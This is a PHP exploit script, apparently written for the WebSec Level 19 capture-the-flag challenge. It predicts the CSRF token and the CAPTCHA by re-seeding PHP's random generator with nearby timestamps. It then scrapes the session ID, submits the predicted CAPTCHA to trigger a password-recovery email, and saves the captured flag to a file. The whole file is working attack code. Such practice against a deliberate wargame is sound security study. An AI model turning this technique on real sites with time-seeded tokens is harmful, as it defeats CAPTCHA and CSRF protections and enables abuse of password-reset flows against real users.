<?php
error_reporting(0);

function generate_random_text($length) {
    $chars  = "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "1234567890";

    $text = '';
    for($i = 0; $i < $length; $i++) {
        $text .= $chars[rand() % strlen($chars)];
    }
    return $text;
}

echo "╔════════════════════════════════════════════════════════════╗\n";
echo "║    WebSec Level 19 - Rapid Fire Prediction Attack         ║\n";
echo "╚════════════════════════════════════════════════════════════╝\n\n";

for ($attempt = 1; $attempt <= 100; $attempt++) {
    echo "[Attempt $attempt]\n";
    
    // Generar predicciones para el segundo actual
    $current_second = time();
    $predictions = [];
    
    for ($offset = -5; $offset <= 5; $offset++) {
        $seed = $current_second + $offset;
        srand($seed);
        $token = generate_random_text(32);
        $captcha = generate_random_text(25);
        $predictions[$token] = [
            'captcha' => $captcha,
            'seed' => $seed
        ];
    }
    
    // INMEDIATAMENTE hacer la request
    $ch = curl_init("https://websec.fr/level19/index.php");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    
    if (!$response) {
        echo "  [-] Request failed\n\n";
        continue;
    }
    
    // Extraer session ID
    if (!preg_match('/PHPSESSID=([a-z0-9]+)/i', $response, $matches)) {
        echo "  [-] Could not extract session ID\n\n";
        continue;
    }
    $session_id = $matches[1];
    
    // Extraer token
    $parts = explode("\r\n\r\n", $response, 2);
    $body = isset($parts[1]) ? $parts[1] : $response;
    
    if (!preg_match('/name="token" value="([^"]+)"/', $body, $token_match)) {
        echo "  [-] Could not extract CSRF token\n\n";
        continue;
    }
    $real_token = $token_match[1];
    
    echo "  [+] Token: $real_token\n";
    
    // ¿Tenemos una predicción que coincida?
    if (isset($predictions[$real_token])) {
        $pred = $predictions[$real_token];
        echo "\n  [+] ✓✓✓ TOKEN MATCH! ✓✓✓\n";
        echo "  [+] Seed: {$pred['seed']} (" . date('H:i:s', $pred['seed']) . ")\n";
        echo "  [+] Predicted CAPTCHA: {$pred['captcha']}\n\n";
        
        // Enviar el CAPTCHA
        $post_data = http_build_query([
            'captcha' => $pred['captcha'],
            'token' => $real_token,
            'submit' => ''
        ]);
        
        $ch = curl_init("https://websec.fr/level19/index.php");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_COOKIE, "PHPSESSID=" . $session_id);
        $result = curl_exec($ch);
        curl_close($ch);
        
        if (strpos($result, 'Password recovery email sent') !== false) {
            echo "\n╔════════════════════════════════════════════════════════════╗\n";
            echo "║                   🎉 SUCCESS! 🎉                         ║\n";
            echo "╠════════════════════════════════════════════════════════════╣\n";
            
            if (preg_match('/WEBSEC\{[^}]+\}/', $result, $flag_match)) {
                echo "║                                                            ║\n";
                echo "║  FLAG: " . str_pad($flag_match[0], 49) . "║\n";
                echo "║                                                            ║\n";
                file_put_contents('/workspace/websec_level19/FLAG.txt', $flag_match[0] . "\n");
            }
            
            echo "╚════════════════════════════════════════════════════════════╝\n";
            exit(0);
        } else {
            echo "  [-] CAPTCHA submission failed\n";
        }
    } else {
        echo "  [-] No matching token\n";
    }
    
    echo "\n";
    usleep(100000); // 100ms delay
}

echo "[-] Failed after 100 attempts\n";
?>